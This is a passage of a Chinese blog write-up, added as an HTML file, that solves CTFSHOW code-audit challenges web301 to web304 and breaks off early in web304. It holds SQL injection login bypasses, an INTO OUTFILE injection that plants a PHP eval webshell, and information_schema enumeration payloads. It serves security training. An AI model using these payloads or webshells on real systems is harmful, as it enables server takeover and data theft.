@@ -1,0 +1,352 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>CTFSHOW | 代码审计 web301 - web310 - WayneJH Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="WayneJH Blog"><meta name="msapplication-TileImage" content="https://oss.waynejoons.icu/picphoto/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="WayneJH Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="CTFSHOW 代码审计专题详细题解"><meta property="og:type" content="blog"><meta property="og:title" content="CTFSHOW | 代码审计 web301 - web310"><meta property="og:url" content="https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/"><meta property="og:site_name" content="WayneJH Blog"><meta property="og:description" content="CTFSHOW 代码审计专题详细题解"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250805221751180.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250805221957645.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250805222436558.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250805223108528.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250805231230062.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250807002327972.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806000425704.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806202231205.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806203309928.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806203331017.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806203702946.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806232656921.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806232943489.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806233322673.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806234655113.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806235039610.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250806235347565.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250807000029190.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250807000005828.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250807000612615.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250807001015215.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808103713652.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808104039222.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808112135126.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808111710684.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808111836466.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808112833858.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808113224736.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808113745465.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808113822062.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808114410473.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808114450866.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808114546586.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808114621457.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808140158580.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808140322770.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808141029596.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808142513037.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808142602645.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808152937306.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808153155228.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808153515278.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808155827562.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808154822481.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808154953959.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808164149264.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808164314527.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808164507700.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808164645697.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808164846064.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808172158944.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808170349659.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808171238869.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808171259237.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808181225141.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808181310245.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808183021767.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808182623011.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808183121097.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808183718425.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808183935633.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250808184043891.png"><meta property="article:published_time" content="2025-08-08T11:46:52.000Z"><meta property="article:modified_time" content="2025-08-08T11:50:33.345Z"><meta property="article:author" content="WayneJoon.H"><meta property="article:tag" content="CTFSHOW"><meta property="article:tag" content="CTF练习"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://oss.waynejoons.icu/picphoto/20250805221751180.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/"},"headline":"CTFSHOW | 代码审计 web301 - web310","image":["https://oss.waynejoons.icu/picphoto/20250805221751180.png","https://oss.waynejoons.icu/picphoto/20250805221957645.png","https://oss.waynejoons.icu/picphoto/20250805222436558.png","https://oss.waynejoons.icu/picphoto/20250805223108528.png","https://oss.waynejoons.icu/picphoto/20250805231230062.png","https://oss.waynejoons.icu/picphoto/20250807002327972.png","https://oss.waynejoons.icu/picphoto/20250806000425704.png","https://oss.waynejoons.icu/picphoto/20250806202231205.png","https://oss.waynejoons.icu/picphoto/20250806203309928.png","https://oss.waynejoons.icu/picphoto/20250806203331017.png","https://oss.waynejoons.icu/picphoto/20250806203702946.png","https://oss.waynejoons.icu/picphoto/20250806232656921.png","https://oss.waynejoons.icu/picphoto/20250806232943489.png","https://oss.waynejoons.icu/picphoto/20250806233322673.png","https://oss.waynejoons.icu/picphoto/20250806234655113.png","https://oss.waynejoons.icu/picphoto/20250806235039610.png","https://oss.waynejoons.icu/picphoto/20250806235347565.png","https://oss.waynejoons.icu/picphoto/20250807000029190.png","https://oss.waynejoons.icu/picphoto/20250807000005828.png","https://oss.waynejoons.icu/picphoto/20250807000612615.png","https://oss.waynejoons.icu/picphoto/20250807001015215.png","https://oss.waynejoons.icu/picphoto/20250808103713652.png","https://oss.waynejoons.icu/picphoto/20250808104039222.png","https://oss.waynejoons.icu/picphoto/20250808112135126.png","https://oss.waynejoons.icu/picphoto/20250808111710684.png","https://oss.waynejoons.icu/picphoto/20250808111836466.png","https://oss.waynejoons.icu/picphoto/20250808112833858.png","https://oss.waynejoons.icu/picphoto/20250808113224736.png","https://oss.waynejoons.icu/picphoto/20250808113745465.png","https://oss.waynejoons.icu/picphoto/20250808113822062.png","https://oss.waynejoons.icu/picphoto/20250808114410473.png","https://oss.waynejoons.icu/picphoto/20250808114450866.png","https://oss.waynejoons.icu/picphoto/20250808114546586.png","https://oss.waynejoons.icu/picphoto/20250808114621457.png","https://oss.waynejoons.icu/picphoto/20250808140158580.png","https://oss.waynejoons.icu/picphoto/20250808140322770.png","https://oss.waynejoons.icu/picphoto/20250808141029596.png","https://oss.waynejoons.icu/picphoto/20250808142513037.png","https://oss.waynejoons.icu/picphoto/20250808142602645.png","https://oss.waynejoons.icu/picphoto/20250808152937306.png","https://oss.waynejoons.icu/picphoto/20250808153155228.png","https://oss.waynejoons.icu/picphoto/20250808153515278.png","https://oss.waynejoons.icu/picphoto/20250808155827562.png","https://oss.waynejoons.icu/picphoto/20250808154822481.png","https://oss.waynejoons.icu/picphoto/20250808154953959.png","https://oss.waynejoons.icu/picphoto/20250808164149264.png","https://oss.waynejoons.icu/picphoto/20250808164314527.png","https://oss.waynejoons.icu/picphoto/20250808164507700.png","https://oss.waynejoons.icu/picphoto/20250808164645697.png","https://oss.waynejoons.icu/picphoto/20250808164846064.png","https://oss.waynejoons.icu/picphoto/20250808172158944.png","https://oss.waynejoons.icu/picphoto/20250808170349659.png","https://oss.waynejoons.icu/picphoto/20250808171238869.png","https://oss.waynejoons.icu/picphoto/20250808171259237.png","https://oss.waynejoons.icu/picphoto/20250808181225141.png","https://oss.waynejoons.icu/picphoto/20250808181310245.png","https://oss.waynejoons.icu/picphoto/20250808183021767.png","https://oss.waynejoons.icu/picphoto/20250808182623011.png","https://oss.waynejoons.icu/picphoto/20250808183121097.png","https://oss.waynejoons.icu/picphoto/20250808183718425.png","https://oss.waynejoons.icu/picphoto/20250808183935633.png","https://oss.waynejoons.icu/picphoto/20250808184043891.png"],"datePublished":"2025-08-08T11:46:52.000Z","dateModified":"2025-08-08T11:50:33.345Z","author":{"@type":"Person","name":"WayneJoon.H"},"publisher":{"@type":"Organization","name":"WayneJH Blog","logo":{"@type":"ImageObject","url":{"text":"WayneJH"}}},"description":"CTFSHOW 代码审计专题详细题解"}</script><link rel="canonical" href="https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/"><link rel="icon" href="https://oss.waynejoons.icu/picphoto/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="WayneJH Blog" type="application/atom+xml">
+</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">WayneJH</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/links">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-08-08T11:46:52.000Z" title="2025/8/8 19:46:52">2025-08-08</time>发表</span><span class="level-item"><a class="link-muted" href="/categories/CTFSHOW/">CTFSHOW</a></span><span class="level-item">32 分钟读完 (大约4820个字)</span><span class="level-item" id="busuanzi_container_page_pv" style="display:none"><span id="busuanzi_value_page_pv">--</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CTFSHOW | 代码审计 web301 - web310</h1><div class="content"><h2 id="什么是代码审计"><a href="#什么是代码审计" class="headerlink" title="什么是代码审计"></a>什么是代码审计</h2><p>代码审计（Code Audit），也称为白盒测试（White-Box Testing），是一种安全评估方法。与黑盒测试相反，审计人员在<strong>拥有应用程序完整源代码</strong>的情况下，对程序的逻辑、结构和代码实现进行深入的分析和审查</p>
+<h2 id="代码审计一般思路"><a href="#代码审计一般思路" class="headerlink" title="代码审计一般思路"></a>代码审计一般思路</h2><p>进行代码审计时，通常会结合自动化工具和人工审查，遵循一个由宏观到微观的系统性流程</p>
+<p><strong>1. 准备阶段 (Preparation)</strong></p>
+<p>这是审计的起点，目的是为后续的深入分析做好准备</p>
+<ul>
+<li><strong>理解业务逻辑</strong>：首先要通读文档或大致浏览代码，理解这个程序是做什么的、核心功能有哪些</li>
+<li><strong>熟悉技术栈和框架</strong>：确定项目使用的编程语言（如PHP、Java、Python）、框架（如ThinkPHP、Spring、Django）和关键组件，了解特定框架的已知漏洞和安全特性</li>
+<li><strong>部署运行环境</strong>：如果条件允许，在本地搭建一个可以运行和调试的测试环境。可以动态地跟踪数据流，验证漏洞，极大地提高审计效率</li>
+</ul>
+<p><strong>2. 自动化扫描与手动分析 (Scanning &amp; Manual Review)</strong></p>
+<p>这个阶段是审计的核心，通常会从寻找高风险的“入口点”和“危险函数”开始</p>
+<ul>
+<li><strong>寻找数据入口（“入”）</strong>：首先要定位用户能够控制数据输入的地方，这些是漏洞最有可能产生的地方<ul>
+<li><strong>全局变量</strong>：如PHP中的 <code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIE</code>、<code>$_REQUEST</code>、<code>$_SERVER</code> 等，它们是外部数据进入程序的主要通道</li>
+<li><strong>文件操作</strong>：关注文件上传、文件读取&#x2F;写入等功能点</li>
+<li><strong>数据库交互</strong>：所有与数据库进行增、删、改、查操作的地方</li>
+</ul>
+</li>
+<li><strong>跟踪数据流（“流”）</strong>：从找到的入口点开始，跟踪这些外部数据在代码中的传递路径。观察数据在传递过程中是否经过了充分的<strong>过滤、净化或编码</strong>。这是判断是否存在漏洞的关键</li>
+<li><strong>定位危险函数（“出”）</strong>：审计的另一个核心是寻找那些能直接导致漏洞的“危险函数”或“敏感操作”，然后<strong>逆向回溯</strong>，看它们的参数是否能被用户的输入所控制<ul>
+<li><strong>SQL注入</strong>：关注所有执行SQL查询的函数，如 <code>query()</code>, <code>execute()</code> 等，看传入的SQL语句是否由外部输入拼接而成</li>
+<li><strong>命令执行</strong>：关注 <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code> 等能执行系统命令的函数</li>
+<li><strong>文件包含&#x2F;读取</strong>：关注 <code>include()</code>, <code>require()</code>, <code>file_get_contents()</code>, <code>readfile()</code> 等函数</li>
+<li><strong>反序列化</strong>：关注 <code>unserialize()</code> 函数，检查其参数来源</li>
+</ul>
+</li>
+</ul>
+<p><strong>3. 漏洞验证与利用链构造 (Verification &amp; Exploitation)</strong></p>
+<p>在发现疑似漏洞后，需要进行验证</p>
+<ul>
+<li><strong>编写验证代码 (PoC)</strong>：根据代码逻辑，构造特定的输入数据（Payload）来触发漏洞，验证其是否存在以及是否可被利用</li>
+<li><strong>构造利用链 (Exploit Chain)</strong>：在复杂的场景中，单个漏洞可能无法造成严重危害，此时需要将多个漏洞点（如文件上传 + 文件包含）组合起来，形成一个完整的攻击链，以达到最终目的（如获取服务器权限）</li>
+</ul>
+<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h3><p>首先下载附件进行分析，可以先看看目录结构</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250805221751180.png"></p>
+<p>其中admin目录为前端页面目录，不需要分析，因此我们把重点放在<code>assets</code>目录里面</p>
+<p>把文件大概看了一下，发现<code>checklogin.php</code>有未过滤的SQL语句，存在SQL注入漏洞</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250805221957645.png"></p>
+<p>打开题目环境，可以看到一个登录框</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250805222436558.png"></p>
+<p>有多种方法可以做这道题，咱们一个个分析</p>
+<p><strong>方法一：联合注入</strong></p>
+<p>分析当前代码，可以看到第17行有个判断语句</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250805223108528.png"></p>
+<p>其中，<strong>strcasecmp</strong>是PHP的字符串比较函数，用于比较两个字符串，如果两个字符串相等，则返回0，因此我们通过联合注入查询输出一个值，例如一个包含单个字面量 <code>1</code> 的结果集，程序把<code>1</code>当成了账号在数据库中查询到的密码，因此我们在密码处也输入相同的数字，即可通过验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select 1#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure>
+
+<p>登录后在首页可以看到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250805231230062.png"></p>
+<p><strong>方法二：SQL注入写shell</strong></p>
+<p>可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure>
+
+<p>执行完之后访问<code>1.php</code>，可以看到成功写入</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250807002327972.png"></p>
+<p>用HackBar执行命令即可，成功读取flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806000425704.png"></p>
+<h3 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h3><p>这题也是沿用之前的附件，方法跟之前一样</p>
+<p><strong>方法一：联合注入</strong></p>
+<p>这题把上题<code>checklogin.php</code>的第17行改成了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>意思就是只要<code>sds_decode($userpwd)</code>跟<code>$row[&#39;sds_password&#39;]</code>相等即可通过验证，我们可以先随便输入一个值到<code>$userpwd</code>，然后让其编码之后得到编码值，再让<code>$row[&#39;sds_password&#39;]</code>通过联合注入输出这个编码值，程序把这个编码值当成了账号在数据库中查询到的密码，最后我们在密码处填入原本的值，经过后台编码后即可通过验证，具体可以看以下操作</p>
+<p>我们在目录中寻找<code>sds_decode()</code>函数，发现其位于<code>fun.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806202231205.png"></p>
+<p>修改一下代码，参数输入<code>1</code>，然后运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">sds_decode</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到编码结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d9c77c4e454869d5d8da3b4be79694d3</span><br></pre></td></tr></table></figure>
+
+<p>然后我们打开登录框，输入账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select &#x27;d9c77c4e454869d5d8da3b4be79694d3&#x27;#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure>
+
+<p>解释一下，输入的<code>1</code>经过<code>sds_decode()</code>函数之后，变成了<code>d9c77c4e454869d5d8da3b4be79694d3</code>，然后我们通过联合注入输出<code>d9c77c4e454869d5d8da3b4be79694d3</code>，程序把这个编码值当成了账号在数据库中查询到的密码，因为我们在登录框密码处输入<code>1</code>，这个密码经过编码后跟我们这个编码值一致，因此就成功通过验证</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806203309928.png"></p>
+<p>登录之后在首页得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806203331017.png"></p>
+<p><strong>方法二：SQL注入写shell</strong></p>
+<p>跟之前一样，可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#</span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806203702946.png"></p>
+<h3 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h3><p>下载附件进行分析，先看看目录结构</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806232656921.png"></p>
+<p><code>checklogin.php</code>这次多了个限制，<code>username</code>长度不能大于6，因此之前的方法用不了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806232943489.png"></p>
+<p>但是登录的检测机制依然不变</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>继续分析项目文件，发现<code>sds_user.sql</code>里面存在用户信息</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806233322673.png"></p>
+<p>用户名是admin，密码是个加密后的值，打开<code>fun.php</code>，可以看到这次贴心给了提示</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806234655113.png"></p>
+<p>直接运行代码，得到值为<code>27151b7b1ad51a38ea66b1529cde5ee4</code>，跟上面sql文件里的一样，因此密码就是admin</p>
+<p>打开网站登录，账号密码都是admin，进去之后点了一番，发现只有<strong>网点一览</strong>能点进去</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806235039610.png"></p>
+<p>进去之后发现是<code>dpt.php</code>页面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250806235347565.png"></p>
+<p>咱们继续回去分析项目文件，发现<code>dpt.php</code>和<code>dptadd.php</code>都存在注入点，且官方也标了注释</p>
+<p><strong>dpt.php</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250807000029190.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from sds_dpt order by id;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>dptadd.php</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250807000005828.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into sds_dpt set sds_name=&#x27;&quot;</span>.<span class="variable">$dpt_name</span>.<span class="string">&quot;&#x27;,sds_address =&#x27;&quot;</span>.<span class="variable">$dpt_address</span>.<span class="string">&quot;&#x27;,sds_build_date=&#x27;&quot;</span>.<span class="variable">$dpt_build_year</span>.<span class="string">&quot;&#x27;,sds_have_safe_card=&#x27;&quot;</span>.<span class="variable">$dpt_has_cert</span>.<span class="string">&quot;&#x27;,sds_safe_card_num=&#x27;&quot;</span>.<span class="variable">$dpt_cert_number</span>.<span class="string">&quot;&#x27;,sds_telephone=&#x27;&quot;</span>.<span class="variable">$dpt_telephone_number</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可惜的是，<code>dpt.php</code>的<code>id</code>并没有办法控制，因此只能从<code>dptadd.php</code>下手，URL拼接路径<code>/dptadd.php</code>，然后通过POST的方式传入参数值，执行SQL注入</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250807000612615.png"></p>
+<p>查表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：sds_dpt,sds_fl9g,sds_user</span><br></pre></td></tr></table></figure>
+
+<p>查字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果为：flag</span><br></pre></td></tr></table></figure>
+
+<p>查字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select flag from sds_fl9g)#</span><br></pre></td></tr></table></figure>
+
+<p>成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250807001015215.png"></p>
+<h3 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h3><p>这题的代码跟上一题相同，不过多了一个全局WAF检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这个WAF逻辑有问题，只要有任意一个字符匹配成功就会返回<code>1</code>，因此并没有什么用</p>
+<p>也是先登录网站，账号和密码都是<code>admin</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250808103713652.png"></p>
+<p>步骤跟上题一样，只不过表名从<code>sds_fl9g</code>改成了<code>sds_flaag</code></p>
+<p>查表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure>
+
